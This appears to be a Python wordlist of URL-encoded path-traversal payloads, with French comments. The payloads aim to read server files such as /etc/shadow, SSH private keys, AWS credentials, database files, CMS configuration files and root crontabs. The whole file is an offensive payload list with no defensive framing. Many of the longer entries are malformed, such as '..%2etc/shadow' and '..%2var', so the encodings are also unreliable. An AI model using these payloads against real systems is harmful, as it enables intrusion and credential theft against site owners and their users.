traversals_1_encoded = [
    # ==============================
    # 1. FICHIERS SYSTÈME CRITIQUES
    # ==============================
    "..%2f..%2f..%2f..%2f..%2f..%2etc/shadow",                   # Hashs mots de passe (root requis)
    "..%2f..%2f..%2f..%2f..%2f..%2etc/group",                    # Groupes
    "..%2f..%2f..%2f..%2f..%2f..%2etc/hostname",                 # Nom de la machine
    "..%2f..%2f..%2f..%2f..%2f..%2etc/hosts",                    # Résolution locale
    "..%2f..%2f..%2f..%2f..%2f..%2etc/resolv.conf",              # DNS
    "..%2f..%2f..%2f..%2f..%2f..%2etc/os-release",               # Infos OS
    "..%2f..%2f..%2f..%2f..%2f..%2etc/issue",                    # Bannière login

    # ==============================
    # 2. CONFIG RÉSEAU & SERVICES
    # ==============================
    "..%2f..%2f..%2f..%2f..%2f..%2etc/network/interfaces",       # Interfaces réseau (Debian/Ubuntu)
    "..%2f..%2f..%2f..%2f..%2f..%2etc/sysctl.conf",              # Paramètres kernel
    "..%2f..%2f..%2f..%2f..%2f..%2etc/services",                 # Liste des ports/services
    "..%2f..%2f..%2f..%2f..%2f..%2etc/ssh/sshd_config",          # Config SSH

    # ==============================
    # 3. LOGS SYSTÈME
    # ==============================
    "..%2f..%2f..%2f..%2f..%2f..%2var/log/syslog",               # Debian/Ubuntu
    "..%2f..%2f..%2f..%2f..%2f..%2var/log/messages",             # RedHat/CentOS
    "..%2f..%2f..%2f..%2f..%2f..%2var/log/auth.log",             # Authentification
    "..%2f..%2f..%2f..%2f..%2f..%2var/log/secure",               # Sécurité (RedHat)
    "..%2f..%2f..%2f..%2f..%2f..%2var/log/dmesg",                # Logs kernel
    "..%2f..%2f..%2f..%2f..%2f..%2var/log/apache2/error.log",    # Logs Apache Debian/Ubuntu
    "..%2f..%2f..%2f..%2f..%2f..%2var/log/httpd/error_log",      # Logs Apache RedHat
    "..%2f..%2f..%2f..%2f..%2f..%2var/log/nginx/error.log",      # Logs Nginx
    "..%2f..%2f..%2f..%2f..%2f..%2var/log/mysql/error.log",      # Logs MySQL

    # ==============================
    # 4. FICHIERS WEB
    # ==============================
    "..%2f..%2f..%2f..%2f..%2f..%2var/www/html/index.html",      # Page par défaut
    "..%2f..%2f..%2f..%2f..%2f..%2var/www/html/index.php",       # Page PHP
    "..%2f..%2f..%2f..%2f..%2f..%2var/www/html/config.php",      # Config PHP
    "..%2f..%2f..%2f..%2f..%2f..%2etc/apache2/apache2.conf",     # Config Apache Debian/Ubuntu
    "..%2f..%2f..%2f..%2f..%2f..%2etc/httpd/conf/httpd.conf",    # Config Apache RedHat
    "..%2f..%2f..%2f..%2f..%2f..%2etc/nginx/nginx.conf",         # Config Nginx
    "..%2f..%2f..%2f..%2f..%2f..%2etc/php/7.4/apache2/php.ini",  # PHP config (Debian/Ubuntu exemple)
    "..%2f..%2f..%2f..%2f..%2f..%2etc/php/8.1/fpm/php.ini",      # PHP config (Debian/Ubuntu récent)
    "..%2f..%2f..%2f..%2f..%2f..%2etc/php.ini",                  # PHP config générique

    # ==============================
    # 5. BASES DE DONNÉES (SQL)
    # ==============================
    "..%2f..%2f..%2f..%2f..%2f..%2var/lib/mysql/mysql/user.MYD",       # MySQL users
    "..%2f..%2f..%2f..%2f..%2f..%2var/lib/mysql/mysql/user.frm",       # MySQL users structure
    "..%2f..%2f..%2f..%2f..%2f..%2var/lib/mysql/mysql.db",             # DB principales
    "..%2f..%2f..%2f..%2f..%2f..%2var/lib/mysql/mysql/user.ibd",       # Table user
    "..%2f..%2f..%2f..%2f..%2f..%2var/lib/mysql/ibdata1",              # Données globales MySQL
    "..%2f..%2f..%2f..%2f..%2f..%2var/lib/mysql/ib_logfile0",          # Logs InnoDB
    "..%2f..%2f..%2f..%2f..%2f..%2var/lib/mysql/ib_logfile1",          # Logs InnoDB
    "..%2f..%2f..%2f..%2f..%2f..%2etc/mysql/my.cnf",                   # Config MySQL (Debian/Ubuntu)
    "..%2f..%2f..%2f..%2f..%2f..%2etc/my.cnf",                         # Config MySQL générique
    "..%2f..%2f..%2f..%2f..%2f..%2var/lib/postgresql/data/pg_hba.conf",# Config PostgreSQL
    "..%2f..%2f..%2f..%2f..%2f..%2var/lib/postgresql/data/postgresql.conf", # Config PostgreSQL
    "..%2f..%2f..%2f..%2f..%2f..%2var/lib/postgresql/data/base",       # Bases PostgreSQL
    "..%2f..%2f..%2f..%2f..%2f..%2data/data/com.mysql/databases.db",   # MySQL sur Android
    "..%2f..%2f..%2f..%2f..%2f..%2var/www/html/db.sqlite3",            # SQLite Django
    "..%2f..%2f..%2f..%2f..%2f..%2var/www/html/database.sqlite",       # SQLite générique
    "..%2f..%2f..%2f..%2f..%2f..%2var/www/html/storage/database.sqlite", # Laravel SQLite
    "..%2f..%2f..%2f..%2f..%2f..%2var/www/html/db.sql",
    "..%2f..%2f..%2f..%2f..%2f..%2var/www/html/backup.sql",
    "..%2f..%2f..%2f..%2f..%2f..%2var/lib/mongodb/mongod.lock",
    "..%2f..%2f..%2f..%2f..%2f..%2var/lib/redis/dump.rdb",
    "..%2f..%2f..%2f..%2f..%2f..%2var/www/html/sql_dump.sql",
    "..%2f..%2f..%2f..%2f..%2f..%2var/www/html/backup/db_backup.sql",
    
    # ==============================
    # 6. CMS POPULAIRES
    # ==============================

    # WordPress
    "..%2f..%2f..%2f..%2f..%2f..%2var/www/html/wp-config.php",         # Config WordPress
    "..%2f..%2f..%2f..%2f..%2f..%2var/www/html/wp-content/uploads",    # Uploads WP
    "..%2f..%2f..%2f..%2f..%2f..%2var/www/html/wp-includes/version.php", # Version WP

    # Drupal
    "..%2f..%2f..%2f..%2f..%2f..%2var/www/html/sites/default/settings.php",

    # Joomla
    "..%2f..%2f..%2f..%2f..%2f..%2var/www/html/configuration.php",

    # Magento
    "..%2f..%2f..%2f..%2f..%2f..%2var/www/html/app/etc/env.php",

    # Laravel
    "..%2f..%2f..%2f..%2f..%2f..%2var/www/html/.env",                  # Config Laravel
    "..%2f..%2f..%2f..%2f..%2f..%2var/www/html/storage/logs/laravel.log",

    # Django
    "..%2f..%2f..%2f..%2f..%2f..%2var/www/html/settings.py",           # Django settings

    # ==============================
    # 7. FICHIERS SENSIBLES GÉNÉRIQUES
    # ==============================
    "..%2f..%2f..%2f..%2f..%2f..%2.env",                               # Fichier d'env générique
    "..%2f..%2f..%2f..%2f..%2f..%2config.json",                        # Config JSON générique
    "..%2f..%2f..%2f..%2f..%2f..%2config.php",                         # Config PHP générique
    "..%2f..%2f..%2f..%2f..%2f..%2settings.py",                        # Config Django
    "..%2f..%2f..%2f..%2f..%2f..%2database.yml",                       # Rails config DB
    "..%2f..%2f..%2f..%2f..%2f..%2composer.json",                      # PHP dépendances
    "..%2f..%2f..%2f..%2f..%2f..%2package.json",                       # NodeJS dépendances
    "..%2f..%2f..%2f..%2f..%2f..%2.git/config",                        # Config Git
    "..%2f..%2f..%2f..%2f..%2f..%2.htaccess",                          # Fichier Apache
    "..%2f..%2f..%2f..%2f..%2f..%2.htpasswd",                          # Mots de passe Apache

    # ==============================
    # 8. CRON JOBS
    # ==============================
    "..%2f..%2f..%2f..%2f..%2f..%2etc/crontab",
    "..%2f..%2f..%2f..%2f..%2f..%2var/spool/cron/root",
    "..%2f..%2f..%2f..%2f..%2f..%2var/spool/cron/crontabs/root",
    
    # ==============================
    # 9. OTHERS
    # ==============================
    "..%2f.htaccess", "..%2f..%2f.htaccess",
    "..%2f.htpasswd", "..%2f..%2f.htpasswd",
    "..%2f.user.ini", "..%2f..%2f.user.ini",
    "..%2fweb.config", "..%2f..%2fweb.config",
    
    # Fichiers config
    "..%2f.env", "..%2f..%2f.env",
    "..%2fconfig.php", "..%2f..%2fconfig.php",
    "..%2fsettings.php", "..%2f..%2fsettings.php",
    "..%2fwp-config.php", "..%2f..%2fwp-config.php",
    "..%2fconfiguration.php", "..%2f..%2fconfiguration.php",
    "..%2fenv.php", "..%2f..%2fenv.php",

    # Logs
    "..%2ferror.log", "..%2f..%2ferror.log",
    "..%2fdebug.log", "..%2f..%2fdebug.log",
    "..%2flaravel.log", "..%2f..%2flaravel.log",

    # Backups
    "..%2fbackup.zip", "..%2f..%2fbackup.zip",
    "..%2fconfig.php.bak", "..%2f..%2fconfig.php.bak",
    "..%2fwp-config.php.old", "..%2f..%2fwp-config.php.old",

    # Credentials
    "..%2f.git/config", "..%2f..%2f.git/config",
    "..%2f.ssh/id_rsa", "..%2f..%2f.ssh/id_rsa",
    "..%2f.aws/credentials", "..%2f..%2f.aws/credentials",

    # CMS
    "..%2fwp-content/debug.log", "..%2f..%2fwp-content/debug.log",
    "..%2fsites/default/settings.php", "..%2f..%2fsites/default/settings.php",
    "..%2fstorage/logs/laravel.log", "..%2f..%2fstorage/logs/laravel.log",

    # Temp
    "..%2fdebug.php", "..%2f..%2fdebug.php"
    
]